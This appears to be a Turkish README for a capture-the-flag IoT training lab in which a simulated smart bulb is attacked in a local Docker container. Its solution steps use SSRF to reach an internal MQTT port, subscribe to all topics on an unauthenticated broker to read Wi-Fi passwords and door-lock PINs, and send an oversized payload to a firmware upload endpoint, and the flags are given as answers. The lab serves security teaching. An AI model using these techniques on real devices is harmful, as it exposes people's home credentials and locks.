# 💡 LAB 3: Karanlık Aydınlanma — Akıllı Ampul MQTT İhlali

> **Zorluk:** ⭐⭐ Kolay-Orta  
> **Süre:** ~25 dakika  
> **Portlar:** 8083 (HTTP Web), 1883 (Simüle MQTT)

---

## 📖 Hikaye

Sadece rengini telefondan değiştirmek için aldığın 15 dolarlık ampul. Masumane görünüyor. Ama bu ampul evin Wi-Fi şifresini biliyor, termostatın hedef sıcaklığını biliyor, kapı kilidinin PIN'ini biliyor. Çünkü hepsi aynı MQTT kanalında konuşuyor — ve bu kanalın kapısında kilit yok.

---

## 🚀 Başlatma

```bash
cd lab3-bulb
docker build -t lab3-bulb .
docker run -d --name lab3-bulb -p 8083:8083 -p 1883:1883 lab3-bulb
```

Tarayıcıda aç: **http://localhost:8083**

---

## 🔍 Çözüm Adımları

### FLAG 1 — SSRF ile MQTT'ye Erişim

**Konsept:** Ampulün "URL çekme" özelliği, iç ağdaki MQTT servisine yönlendirilebilir.

1. Sayfadaki **SSRF Tester** panelini bul
2. URL alanına şunu yaz: `http://localhost:1883`
3. "URL'yi Çek" butonuna bas

```bash
curl "http://localhost:8083/api/fetch?url=http://localhost:1883"
```

```
FLAG{ssrf_t0_mqtt_1nt3rn4l}
```

---

### FLAG 2 — Anonim MQTT Erişimi

**Konsept:** MQTT broker kimlik doğrulama gerektirmiyor. Tüm ev cihazlarının mesajları açıkta.

1. **MQTT Mesajlarını Oku** butonuna bas
2. Dönen JSON'da Wi-Fi şifresi, kapı PIN'i, kamera şifresi görünür

```bash
curl "http://localhost:8083/api/mqtt/messages"
```

Gerçek bir ortamda doğrudan MQTT bağlantısı:
```bash
# mosquitto_pub/sub araçları ile (eğer yüklüyse)
mosquitto_sub -h localhost -p 1883 -t "#" -v
```

`#` wildcard tüm topikleri dinler — auth yoksa tüm ev cihazlarının verisi akar.

```
FLAG{anon_mqtt_r3ads_3v3ryth1ng}
```

---

### FLAG 3 — Firmware Buffer Overflow Simülasyonu

**Konsept:** Firmware yükleme endpointi girdi boyutunu kontrol etmiyor.

1. **Overflow Payload Gönder** butonuna bas (2048 byte gönderir, buffer 1024)
2. Sunucu "Segmentation fault" simüle eder ve FLAG döner

```bash
# Elle test etmek için:
python3 -c "print('A'*2048)" | curl -X POST http://localhost:8083/api/firmware/upload \
  -H "Content-Type: application/octet-stream" --data-binary @-
```

```
FLAG{buff3r_0v3rfl0w_f1rmw4r3}
```

---

## 🔵 Blue Team Notu

```bash
docker logs -f lab3-bulb
```

MQTT anonim bağlantılar loglara düşer, her erişim kayıt altına alınır.

---

*Sonraki Lab → [LAB 4: Fiziksel İllüzyon - Akıllı Kilit](../lab4-lock/README.md)*
